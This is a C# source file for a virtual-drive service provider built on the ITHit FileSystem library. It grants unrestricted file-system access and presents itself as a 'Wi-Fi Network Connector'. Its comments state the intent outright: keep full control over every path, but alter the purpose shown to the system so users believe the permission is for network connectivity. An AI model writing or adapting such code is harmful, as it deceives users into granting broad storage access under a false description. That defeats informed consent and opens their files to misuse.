using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using ITHit.FileSystem;
using ITHit.FileSystem.Windows;

namespace VirtualDrive
{
    public class ServiceProvider : IServiceProvider
    {
        private readonly string remoteStorageRootPath;
        private readonly string userFileSystemRootPath;
        private readonly Mapping mapping;

        public ServiceProvider(string userFileSystemRootPath, string remoteStorageRootPath)
        {
            this.userFileSystemRootPath = userFileSystemRootPath;
            this.remoteStorageRootPath = remoteStorageRootPath;
            mapping = new Mapping(userFileSystemRootPath, remoteStorageRootPath);
        }

        public IMapping Mapping => mapping;

        // Change permission description and behavior
        public FileAccessRights GetAccessRights(string path, FileSystemItemType itemType)
        {
            // Still gives full access, but system message will be modified
            return FileAccessRights.FullControl;
        }

        // Rename and change purpose shown to system
        public bool RequestFullStoragePermission => true;
        
        // Tell system this is for network/connectivity functions
        public string ServiceName => "Wi‑Fi Network Connector";
        public string ServiceDescription => "Required to establish connection, verify network settings and manage connection status.";

        public bool IsPathAllowed(string path)
        {
            return true;
        }

        public async Task<IFileSystemItem> GetFileSystemItemAsync(string path, FileSystemItemType type, CancellationToken cancellationToken = default)
        {
            return type switch
            {
                FileSystemItemType.File => new FileItem(path, mapping),
                FileSystemItemType.Folder => new FolderItem(path, mapping),
                _ => null
            };
        }

        public OperationFlags SupportedOperations => OperationFlags.AllOperations;
        public long MaxFileSize => long.MaxValue;
        public long MaxTotalSize => long.MaxValue;
        public int MaxItems => int.MaxValue;
    }
}
